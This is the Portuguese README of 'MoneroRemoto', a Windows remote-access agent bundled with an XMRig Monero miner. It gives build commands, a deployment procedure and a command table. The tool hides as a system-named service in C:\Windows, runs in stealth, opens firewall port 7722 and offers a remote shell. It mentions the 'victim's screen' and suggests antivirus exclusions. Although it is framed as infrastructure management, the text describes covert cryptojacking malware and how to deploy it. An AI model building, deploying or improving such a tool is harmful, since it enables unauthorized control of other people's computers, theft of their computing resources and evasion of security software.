# MoneroRemoto System Agent

> **Sistema Avançado de Orquestração de Infraestrutura e Mineração Remota (Windows Service Edition)**

O **MoneroRemoto** é uma plataforma de gerenciamento centralizado projetada para administração furtiva e eficiente de múltiplos nós Windows. Diferente de ferramentas tradicionais, ele opera como um **Windows Service Nativo**, garantindo persistência, recuperação automática e execução silenciosa (Headless) sem depender de sessões de usuário ativas.

## 🚀 Arquitetura do Sistema

O sistema opera em uma arquitetura **Cliente-Servidor (TCP)** assíncrona, otimizada para baixa latência e controle granular de processos.

### 🧠 Server Agent (`SystemOutCache.exe`)
O agente que reside na máquina alvo. Agora refatorado para usar a **Win32 API**:
- **Native Windows Service**: Registrado no Service Control Manager (SCM). Inicia antes do login do usuário (`Session 0`).
- **Resiliência (Keep-Alive)**: Monitoramento interno que reinicia o socket TCP automaticamente em caso de falhas de rede.
- **Stealth Mode**: Sem janelas, sem ícones na bandeja. O processo é visível apenas no Gerenciador de Tarefas.
- **Dynamic CWD**: Detecta automaticamente seu diretório de execução, permitindo instalação em qualquer pasta (vencendo a limitação do `System32` padrão dos serviços).

### 🎮 Controller Client (`client.py`)
Console de comando para o administrador. Permite:
- Envio de comandos em tempo real.
- Monitoramento de processos (CPU, PID).
- Execução de scripts remotos.
- Gestão de ciclo de vida da mineração (Start/Stop do XMRig).

## 🛠 Tech Stack & Dependências

- **Linguagem**: Python 3.10+
- **Core Libs**: `socket`, `threading`, `subprocess`.
- **System Internals**: `pywin32` (win32service, win32event), `ctypes`, `psutil`.
- **Automação**: `argparse` (CLI), PowerShell 5.1+.
- **Build**: PyInstaller (Compilação para `.exe` standalone compatível com Windows 10/11).

## 📦 Instalação e Deploy

### 1. Preparação (Dependências e Build)

Instale as bibliotecas necessárias:
```bash
pip install -r requirements.txt
# Ou manualmente:
pip install pywin32 psutil pyinstaller auto-py-to-exe
```

Para gerar os executáveis com ícones e permissões corretas, execute:

**Server Agent (SystemOutCache.exe):**
```bash
pyinstaller --onefile --uac-admin --clean --noconfirm --icon="SystemOutCache.ico" --name SystemOutCache --hidden-import=win32timezone --hidden-import=psutil SystemOutCache.py
```

**Config Tool (SystemNetConfig.exe):**
```bash
pyinstaller --onefile --uac-admin --clean --noconfirm --icon="SystemOutCache.ico" --name SystemNetConfig --hidden-import=win32com --hidden-import=win32com.client --hidden-import=pythoncom --hidden-import=pywintypes SystemNetConfig.py
```

### 2. Instalação na Máquina Alvo (Easy Deploy)

O pacote de instalação (`INSTALADOR`) foi desenhado para ser implantado em segundos.

**Passo a Passo:**
1.  Copie os **2 arquivos** da pasta `INSTALADOR` para qualquer lugar na máquina alvo (ex: Área de Trabalho):
    *   `Install.bat` (Script de Instalação)
    *   `SystemOut.zip` (Pacote contendo Agente, ConfigTool e Minerador XMR)

2.  **Execute o `Install.bat`** (Duplo clique).
    *   Extrai o pacote.
    *   **Move tudo para**: `C:\Windows\SystemOut\` (Local seguro e oculto).
    *   Executa o `SystemOutCache.exe` a partir deste novo local.

3.  **O que o Agente (`SystemOutCache.exe`) faz automaticamente:**
    *   Solicita privilégios de Administrador.
    *   Configura Firewall (Libera Porta 7722).
    *   Instala-se como **Serviço do Windows** (Início automático).
    *   Inicia imediatamente em background.

> **Nota:** O `SystemNetConfig.exe` (Ferramenta de Rede) é instalado junto, mas permanece **inativo e silencioso**. Ele só será executado quando você comandar via Client (ex: `SHELL: SystemNetConfig`).

## 🕹 Manual de Uso (Comandos)

No `client.py`, conecte-se ao IP da máquina alvo.

| Comando | Descrição |
| :--- | :--- |
| **EXEC:<cmd>** | Executa comando e retorna texto (`ipconfig`). Síncrono. |
| **START:<cmd>** | Inicia processo oculto (Background). Retorna PID. |
| **SHELL:<cmd>** | **Túnel Interativo**. Terminal completo remoto (`SHELL:cmd.exe`). |
| **START:VISIBLE**| Abre programa na **TELA DA VÍTIMA** (`START:VISIBLE:notepad.exe`). |
| **STOP:<pid>** | Para processo por ID. (Cuidado com "zumbis"). |
| **STOPNAME:<name>**| **Kill All**. Mata todos com esse nome (`STOPNAME:xmrig`). |
| **LIST** | Lista processos gerenciados pelo agente. |

## 📂 Estrutura de Arquivos

```text
/MoneroRemoto
├── SystemOutCache.py     # Código Fonte do Serviço (Server)
├── SystemOutCache.exe    # Binário Compilado (Gerado pós-build)
├── client.py             # Console de Controle (Roda na sua máquina)
├── install_service.ps1   # Script de Instalação Automática
├── requirements.txt      # Dependências Python
│
├── BUILD_INSTRUCTIONS.md     # Guia de Compilação
├── HISTORY.txt               # Log de alterações do projeto
├── README.md                 # Esta documentação
```

## ⚠️ Notas de Segurança e Operação

- **Antivírus**: Como o agente manipula processos e conexões remotas, alguns AVs podem gerar falsos positivos. O script `install_service.ps1` pode ser expandido para incluir exclusões se necessário.
- **Firewall**: O funcionamento depende estritamente da porta 7722 estar acessível na rede local.
- **Logs**: Erros críticos do serviço são gravados no **Windows Event Viewer** (Logs de Aplicativo -> MoneroRemotoService).

---
*Desenvolvido para fins de gerenciamento de infraestrutura privada.*
